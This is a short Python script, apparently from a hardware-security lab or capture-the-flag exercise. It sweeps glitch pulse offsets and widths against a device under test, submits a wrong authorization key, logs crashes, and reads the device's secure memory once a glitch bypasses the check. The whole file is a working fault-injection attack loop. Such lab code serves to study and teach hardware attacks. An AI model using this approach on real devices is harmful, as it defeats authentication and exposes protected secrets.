"""
Try all possible combinations of offset and width
"""

from glitch_ctrl import GlitchController, TriggerConfiguration
from dut import DuT

WIDTH_BEGIN = 3
WIDTH_END = 4

OFFSET_BEGIN = 2000
OFFSET_END = 4000
FLG = 1

dut = DuT()
dut.reset()
glitcher = GlitchController()
edge = TriggerConfiguration.TRIGGER_EXTERNAL_RISING_EDGE
text = []

try:
    for i in range(OFFSET_BEGIN, OFFSET_END):
        for j in range(WIDTH_BEGIN, WIDTH_END):
            glitcher.reset()
            glitcher.pulse_offset = i
            glitcher.pulse_width = j

            glitcher.trigger_on = edge
            dut.authorize(b"1234567890123456789012345678901234567890123456789012345678901234")
            check = dut.ping()
            if not check:
                line = f"offset:{i} width:{j} crashed"
                text.append(line+'\n')
                print(line)
                dut.reset()
            if dut.authorized:
                line = f"*** offset:{i} width:{j} authorized"
                text.append(line+'\n')
                print(line)
                if FLG:
                    dut.read_secure_memory()
                    FLG = 0
            
except Exception as e:
    print(e)

with open('log.txt', 'a') as f:
    f.write(f"------width:{WIDTH_BEGIN}-{WIDTH_END-1} offset:{OFFSET_BEGIN}-{OFFSET_END-1}\n")
    for i in text:
        f.write(i)
        

